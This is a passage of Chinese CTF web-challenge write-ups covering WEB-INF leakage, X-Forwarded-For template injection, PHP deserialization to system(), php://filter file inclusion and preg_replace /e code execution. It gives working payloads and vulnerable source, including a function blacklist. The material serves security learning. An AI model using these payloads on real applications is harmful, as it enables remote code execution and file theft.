<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">截取部分内容：</span><br><span class="line">WEB-INF/web.xml泄露</span><br><span class="line"></span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录：</span><br><span class="line">    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 <span class="class"><span class="keyword">class</span> 文件，包括 <span class="title">servlet</span> <span class="title">class</span> 和非<span class="title">servlet</span> <span class="title">class</span>，他们不能包含在 .<span class="title">jar</span>文件中</span></span><br><span class="line"><span class="class">    /<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">lib</span>/：存放<span class="title">web</span>应用需要的各种<span class="title">JAR</span>文件，放置仅在这个应用中要求使用的<span class="title">jar</span>文件,如数据库驱动<span class="title">jar</span>文件</span></span><br><span class="line"><span class="class">    /<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">src</span>/：源码目录，按照包名结构放置各个<span class="title">java</span>文件。</span></span><br><span class="line"><span class="class">    /<span class="title">WEB</span>-<span class="title">INF</span>/<span class="title">database</span>.<span class="title">properties</span>：数据库配置文件</span></span><br></pre></td></tr></table></figure>

<p>根据上面下载flag的class执行文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">get:</span><br><span class="line">   /Dowlond</span><br><span class="line">post:</span><br><span class="line">   /WEB-INF/classes/com/wm/ctf/FlagController.<span class="keyword">class</span></span><br></pre></td></tr></table></figure>

<p>下载下来后，文件内部有一个base64代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ZmxhZ3tjYzhlZjY3My1mZWZiLTQ4YWItOGU1My00NWU2MWMyODY2Njh9Cg==</span><br><span class="line"><span class="comment">// 解析下：</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;&lt;ZmxhZ3tjYzhlZjY3My1mZWZiLTQ4YWItOGU1My00NWU2MWMyODY2Njh9Cg==&#x27;</span>);</span><br><span class="line"><span class="comment">// 能解析出来，有flag就是了</span></span><br></pre></td></tr></table></figure>

<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">问题<span class="number">1</span>：遇到模板漏洞怎么辨别是什么语言的？</span><br><span class="line">   插件识别语言类型</span><br><span class="line">问题<span class="number">2</span>：怎么攻克java的模板漏洞</span><br><span class="line">   目前看，还是得依赖网上的EXP，自己做的话还得多积累</span><br><span class="line">   一个是扫描，另外一个是观察源码当中的任何参数传递。</span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><h2 id="原始信息-2"><a href="#原始信息-2" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">flag.php页面出现一个框框，里面显示着IP地址</span><br><span class="line">并且数据包缺少XFF</span><br></pre></td></tr></table></figure>

<h2 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h2><p>原本以为XFF仅仅作转IP到内网用的，却没想到还能碰到XFF模板漏洞。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">XFF模板注入攻击：</span><br><span class="line"><span class="comment"># 测是否存在模板漏洞</span></span><br><span class="line">X-Forwarded-For: &#123;&#123;<span class="number">8</span>*<span class="number">9</span>&#125;&#125;</span><br><span class="line"><span class="comment"># 开始尝试执行php代码</span></span><br><span class="line">X-Forwarded-For: &#123;&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;&#125;</span><br><span class="line"><span class="comment"># 执行成功后，尝试扫目录：</span></span><br><span class="line">X-Forwarded-For: &#123;&#123;<span class="string">&#x27;ls /&#x27;</span>&#125;&#125;</span><br><span class="line"><span class="comment"># 尝试获取flag</span></span><br><span class="line">X-Forwarded-For: &#123;&#123;<span class="string">&#x27;cat /flag&#x27;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><h2 id="原始信息-3"><a href="#原始信息-3" class="headerlink" title="原始信息"></a>原始信息</h2><p>一个不断刷新的数据包，以及它的回显</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: da939493-<span class="number">9</span>bee-<span class="number">4</span>bd5-bc93-f1d4fd0195ee.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Referer: http://da939493-9bee-4bd5-bc93-f1d4fd0195ee.node4.buuoj.cn:81/index.php</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 29</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">func=date&amp;p=Y-m-d+h%3Ai%3As+a</span></span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: openresty</span><br><span class="line">Date: Wed, 16 Aug 2023 02:27:09 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Content-Length: 1048</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">X-Powered-By: PHP/5.5.38</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>phpweb<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;bg.jpg&quot;</span>) no-repeat;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-size</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">p</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">javascript</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">setTimeout</span>(<span class="string">&quot;document.form1.submit()&quot;</span>,<span class="number">5000</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  date(): It is not safe to rely on the system&#x27;s timezone settings. You are *required* to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone &#x27;UTC&#x27; for now, but please set date.timezone to select your timezone. in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>24<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">2023-08-16 02:27:09 am<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">id</span>=<span class="string">form1</span> <span class="attr">name</span>=<span class="string">form1</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">func</span> <span class="attr">name</span>=<span class="string">func</span> <span class="attr">value</span>=<span class="string">&#x27;date&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">p</span> <span class="attr">name</span>=<span class="string">p</span> <span class="attr">value</span>=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h2><p>仔细观察是可以发现一些东西的对应关系的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">func=date&amp;p=Y-m-d+h%<span class="number">3</span>Ai%<span class="number">3</span>As+a</span><br><span class="line">对应</span><br><span class="line"><span class="number">2023</span>-<span class="number">08</span>-<span class="number">16</span> <span class="number">02</span>:<span class="number">27</span>:<span class="number">09</span> am&lt;/p&gt;</span><br></pre></td></tr></table></figure>

<p>data显然是控制了后面为时间，并且显示出来。<br>为了验证码我们的猜想，尝试配对：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">func=file_get_contents&amp;p=index.php</span><br></pre></td></tr></table></figure>

<p>回显</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;shell_exec&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;passthru&quot;</span>, <span class="string">&quot;proc_open&quot;</span>, <span class="string">&quot;show_source&quot;</span>, <span class="string">&quot;phpinfo&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;dl&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;proc_terminate&quot;</span>, <span class="string">&quot;touch&quot;</span>, <span class="string">&quot;escapeshellcmd&quot;</span>, <span class="string">&quot;escapeshellarg&quot;</span>, <span class="string">&quot;assert&quot;</span>, <span class="string">&quot;substr_replace&quot;</span>, <span class="string">&quot;call_user_func_array&quot;</span>, <span class="string">&quot;call_user_func&quot;</span>, <span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>, <span class="string">&quot;registregister_shutdown_function&quot;</span>, <span class="string">&quot;register_tick_function&quot;</span>, <span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>, <span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>, <span class="string">&quot;pcntl_exec&quot;</span>, <span class="string">&quot;fopen&quot;</span>, <span class="string">&quot;fwrite&quot;</span>, <span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 回调函数，一个是函数一个是参数</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    <span class="comment">// 获取数据类型</span></span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">    <span class="comment">// 是字符串就返回该变量</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义时间的显示格式</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="comment">// 定义需要调用的函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 收尾的魔术方法</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 掉用上面定义的函数来执行该方法</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="comment">// 字符串换小写的函数</span></span><br><span class="line">    <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">    <span class="comment">// 直接查找是否存在于被限制的函数当中,而不是正则表达式的严谨过滤</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这门看直接序列化那个Test再换掉函数就能随便查flag了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构造Payload</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// 定义时间的显示格式</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;tac /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="comment">// 定义需要调用的函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// var_dump($b);</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 而后放到数据包当中</span></span><br><span class="line">func=unserialize&amp;p=O:<span class="number">4</span>:<span class="string">&quot;Test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;tac /tmp/flagoefiu4r93&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;&#125;</span><br><span class="line"><span class="comment">// 直接出flag</span></span><br></pre></td></tr></table></figure>

<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>php反序列化。以及无效的黑名单过滤。</p>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><h2 id="原始信息-4"><a href="#原始信息-4" class="headerlink" title="原始信息"></a>原始信息</h2><p>从题目提供的源码当中找到这么一段：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;</span><br><span class="line">   <span class="comment">// strpos限制字符串为特定的字符串才能通过验证</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span>) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span>) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>)) &#123;</span><br><span class="line">      <span class="comment">// 拼装php后缀进行文件包含。</span></span><br><span class="line">      <span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>同时也知晓了flag就在当前目录下。</p>
<h2 id="解题-4"><a href="#解题-4" class="headerlink" title="解题"></a>解题</h2><p>文件包含漏洞，但是要尝试绕过过滤的东西。<br>总结来讲，文件包含漏洞尽可能的去尝试下伪协议，说不定能绕过很多东西。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 直接读取flag文件</span></span><br><span class="line">http:<span class="comment">//xxx.xxx.com/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</span></span><br></pre></td></tr></table></figure>

<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><h2 id="原始信息-5"><a href="#原始信息-5" class="headerlink" title="原始信息"></a>原始信息</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="解题-5"><a href="#解题-5" class="headerlink" title="解题"></a>解题</h2><p>上面提示了一个next.php,试着去抓出里面的内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先写两个伪协议绕过</span></span><br><span class="line">get:</span><br><span class="line">   ?text=data:<span class="comment">//text/plain;base64,SSBoYXZlIGEgZHJlYW0=&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>：</span><br><span class="line">   I have a dream</span><br><span class="line"></span><br><span class="line">   PD9waHAKJGlkID0gJF9HRVRbJ2lkJ107CiRfU0VTU0lPTlsnaWQnXSA9ICRpZDsKCmZ1bmN0aW9uIGNvbXBsZXgoJHJlLCAkc3RyKSB7CiAgICByZXR1cm4gcHJlZ19yZXBsYWNlKAogICAgICAgICcvKCcgLiAkcmUgLiAnKS9laScsCiAgICAgICAgJ3N0cnRvbG93ZXIoIlxcMSIpJywKICAgICAgICAkc3RyCiAgICApOwp9CgoKZm9yZWFjaCgkX0dFVCBhcyAkcmUgPT4gJHN0cikgewogICAgZWNobyBjb21wbGV4KCRyZSwgJHN0cikuICJcbiI7Cn0KCmZ1bmN0aW9uIGdldEZsYWcoKXsKCUBldmFsKCRfR0VUWydjbWQnXSk7Cn0K</span><br></pre></td></tr></table></figure>

<p>解码base64得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="comment">// 使用正则表达式，e表示匹配后eval执行strtolower</span></span><br><span class="line">   <span class="comment">// 参数名和值分割开了</span></span><br><span class="line">   <span class="comment">// 这里需要灵活点的是自己定义参数名</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">      <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">      <span class="variable">$str</span></span><br><span class="line">   );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">   <span class="comment">// 取出key和value，分别传入</span></span><br><span class="line">   <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说实在，这是最难过的关口。具体参考这个大哥的博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sipc-love/p/14289984.html">大佬</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">具体的讲，就是传入的参数名和参数值会作为正则表达式的匹配项和被匹配字符串。如果能被匹配到就能实现<span class="keyword">eval</span>执行</span><br><span class="line">（所以说getFlag就是个烟雾弹是吧……）</span><br><span class="line"></span><br><span class="line">$&#123;&#125; : 这个写法是表示一个变量，匹配前先解析掉</span><br><span class="line">\S* : 这个是表示匹配全部的意思。</span><br><span class="line"><span class="comment">// 验证能执行</span></span><br><span class="line">/next.php?\S*=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 能行后，尝试访问根目录</span></span><br><span class="line">?\S*=$&#123;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)))&#125;</span><br><span class="line"><span class="comment">// 返回</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">20</span>) &#123; [<span class="number">0</span>]=&gt; <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;.&quot;</span> [<span class="number">1</span>]=&gt; <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;..&quot;</span> [<span class="number">2</span>]=&gt; <span class="keyword">string</span>(<span class="number">10</span>) <span class="string">&quot;.dockerenv&quot;</span> [<span class="number">3</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;bin&quot;</span> [<span class="number">4</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;dev&quot;</span> [<span class="number">5</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;etc&quot;</span> [<span class="number">6</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;flag&quot;</span> [<span class="number">7</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;home&quot;</span> [<span class="number">8</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;lib&quot;</span> [<span class="number">9</span>]=&gt; <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;media&quot;</span> [<span class="number">10</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;mnt&quot;</span> [<span class="number">11</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;proc&quot;</span> [<span class="number">12</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;root&quot;</span> [<span class="number">13</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;run&quot;</span> [<span class="number">14</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;sbin&quot;</span> [<span class="number">15</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;srv&quot;</span> [<span class="number">16</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;sys&quot;</span> [<span class="number">17</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;tmp&quot;</span> [<span class="number">18</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;usr&quot;</span> [<span class="number">19</span>]=&gt; <span class="keyword">string</span>(<span class="number">3</span>) <span class="string">&quot;var&quot;</span> &#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 看到flag后，直接展示它的内容：</span></span><br><span class="line">?\S*=$&#123;<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>))[<span class="number">6</span>]))&#125;</span><br><span class="line"><span class="comment">//返回</span></span><br></pre></td></tr></table></figure>

